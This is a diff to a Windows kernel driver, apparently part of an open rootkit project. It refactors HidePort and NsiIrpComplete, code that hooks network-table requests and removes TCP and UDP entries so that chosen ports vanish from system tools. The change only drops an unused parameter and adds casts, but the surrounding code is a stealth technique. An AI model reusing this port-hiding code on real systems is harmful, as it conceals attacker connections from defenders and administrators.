@@ -332,8 +332,7 @@ NTSTATUS HidePort(_Inout_ PVOID entries,
 	_In_ PNSI_PARAM nsiParameter, 
 	_Inout_ PNSI_STATUS_ENTRY statusEntries,
 	_Inout_ PNSI_PROCESS_ENTRY processEntries, 
-	_In_ SIZE_T index,
-	_In_ MODE mode) {
+	_In_ SIZE_T index) {
 	NTSTATUS status = STATUS_SUCCESS;
 	PUCHAR pEntries = static_cast<PUCHAR>(entries);
 
@@ -352,7 +351,6 @@ NTSTATUS HidePort(_Inout_ PVOID entries,
 		}
 	}
 	else {
-		PEPROCESS currentProcess = PsGetCurrentProcess();
 		SIZE_T bytesToMove = (nsiParameter->Count - (index + 1)) * nsiParameter->EntrySize;
 		errno_t err = memmove_s(pEntries + index * nsiParameter->EntrySize,
 			bytesToMove,
@@ -434,7 +432,9 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 						addressMode = VALID_KERNELMODE_MEMORY(reinterpret_cast<ULONGLONG>(&tcpEntries[i])) ? 
 							KernelMode : 
 							UserMode;
-						guard.GuardMemory(&tcpEntries[i], sizeof(NSI_TABLE_TCP_ENTRY), addressMode);
+						guard.GuardMemory(&tcpEntries[i], 
+							sizeof(NSI_TABLE_TCP_ENTRY), 
+							static_cast<KPROCESSOR_MODE>(addressMode));
 
 						if (!guard.IsValid()) [[ unlikely ]]
 							continue;
@@ -451,8 +451,7 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 									nsiParameter,
 									statusEntries,
 									processEntries,
-									i,
-									addressMode))) {
+									i))) {
 									break;
 								}
 								entriesHidden++;
@@ -469,8 +468,7 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 									nsiParameter,
 									statusEntries,
 									processEntries,
-									i,
-									addressMode))) {
+									i))) {
 									break;
 								}
 								entriesHidden++;
@@ -486,7 +484,9 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 						addressMode = VALID_KERNELMODE_MEMORY(reinterpret_cast<ULONGLONG>(&udpEntries[i])) ? 
 							KernelMode : 
 							UserMode;
-						guard.GuardMemory(&udpEntries[i], sizeof(NSI_UDP_ENTRY), addressMode);
+						guard.GuardMemory(&udpEntries[i], 
+							sizeof(NSI_UDP_ENTRY), 
+							static_cast<KPROCESSOR_MODE>(addressMode));
 
 						if (!guard.IsValid()) [[ unlikely ]]
 							continue;
@@ -502,8 +502,7 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 									nsiParameter,
 									statusEntries,
 									processEntries,
-									i,
-									addressMode))) {
+									i))) {
 									break;
 								}
 								entriesHidden++;
